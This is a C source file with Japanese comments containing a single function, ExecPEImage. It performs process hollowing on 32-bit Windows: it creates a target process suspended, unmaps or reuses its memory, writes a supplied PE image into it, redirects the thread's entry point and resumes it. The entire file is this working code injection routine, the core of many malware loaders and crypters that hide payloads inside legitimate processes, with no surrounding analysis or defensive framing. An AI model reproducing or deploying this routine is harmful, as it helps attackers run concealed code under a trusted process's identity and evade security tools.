// -------------------------------------------------------------
// メモリイメージを実行する関数
//   引数：pe（PEファイルのヘッダポインタ構造体のポインタ）
//         pMemImage     （メモリイメージのポインタ）
//         dwMemImageSize（メモリイメージのサイズ）
//         szTargetProc  （ターゲットプロセスのパス）
// 戻り値：成功時0、失敗時0以外
// -------------------------------------------------------------
int ExecPEImage(PPE_HEADERS pe, 
				LPVOID pMemImage,
				DWORD dwMemImageSize,
				PTCHAR szTargetProc)
{
	// プロセス生成
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	BOOL bFlag = CreateProcess(NULL, szTargetProc,
		NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if( ! bFlag)
		return -1;

	// 生成したプロセス内のスレッドコンテキスト取得
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(pi.hThread, &ctx);

	PROCINFO piChildInfo;
	DWORD *pebInfo = (DWORD *)ctx.Ebx;

	// 生成したプロセスのベースアドレスを取得
	DWORD dwRead;
	ReadProcessMemory(pi.hProcess, &pebInfo[2], 
		(LPVOID)&(piChildInfo.dwBaseAddr), sizeof(DWORD), &dwRead);
	
	DWORD dwCurAddr = piChildInfo.dwBaseAddr;
	// フリーに扱えるメモリ領域を検索
	MEMORY_BASIC_INFORMATION mbiInfo;
	while(VirtualQueryEx(pi.hProcess, 
		(LPVOID)dwCurAddr, &mbiInfo, sizeof(mbiInfo)))
	{
		if(mbiInfo.State == MEM_FREE)
			break;
		dwCurAddr += mbiInfo.RegionSize;
	}
	
	// 生成したプロセスが割り当ているメモリサイズを取得
	piChildInfo.dwImageSize = dwCurAddr - (DWORD)piChildInfo.dwBaseAddr;

	LPVOID lpProcessMem;
	
	// 生成されたプロセスのメモリ空間に収まるならそのまま利用する
	if(pe->poh->ImageBase == piChildInfo.dwBaseAddr && 
		dwMemImageSize <= piChildInfo.dwImageSize)
	{
		lpProcessMem = (LPVOID)piChildInfo.dwBaseAddr;
		DWORD dwOldProtect;
		VirtualProtectEx(pi.hProcess, 
			(LPVOID)piChildInfo.dwBaseAddr, piChildInfo.dwImageSize, 
			PAGE_EXECUTE_READWRITE, &dwOldProtect);
	
	// 生成されたプロセスのメモリ空間に収まらないならば
	// 新しくメモリ空間を割り当てる
	}else{
		// ZwUnmapViewOfSection関数は
		// プロセスの仮想アドレス空間にマップされたビューを解放する
		PTRZwUnmapViewOfSection pZwUnmapViewOfSection = 
			(PTRZwUnmapViewOfSection)GetProcAddress(
			GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
		// メモリを開放
		if(pZwUnmapViewOfSection(
			pi.hProcess, (LPVOID)piChildInfo.dwBaseAddr) == 0)
		{
			// 強引にメモリ空間を確保する
			lpProcessMem = VirtualAllocEx(pi.hProcess, 
				(LPVOID)pe->poh->ImageBase, dwMemImageSize, 
				MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if( ! lpProcessMem)
				return -1;
		}
	}
	
	pebInfo = (DWORD *)ctx.Ebx;

	// プロセスのベースアドレスを書き換える
	DWORD dwWrote;
	WriteProcessMemory(pi.hProcess, &pebInfo[2], 
		&lpProcessMem, sizeof(DWORD), &dwWrote);

	// メモリイメージをプロセス空間へコピー
	if( ! WriteProcessMemory(pi.hProcess, 
		lpProcessMem, pMemImage, dwMemImageSize, NULL))
	{
		TerminateProcess(pi.hProcess, 0);
		return -1;
	}
	
	// プログラムのエントリポイントをEAXへ
	if((DWORD)lpProcessMem == piChildInfo.dwBaseAddr)
		ctx.Eax = pe->poh->ImageBase + pe->poh->AddressOfEntryPoint;
	else
		ctx.Eax = (DWORD)lpProcessMem + pe->poh->AddressOfEntryPoint;

	// コンテキストをセットしてプロセスを開始
	ctx.ContextFlags = CONTEXT_FULL;
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	return 0;
}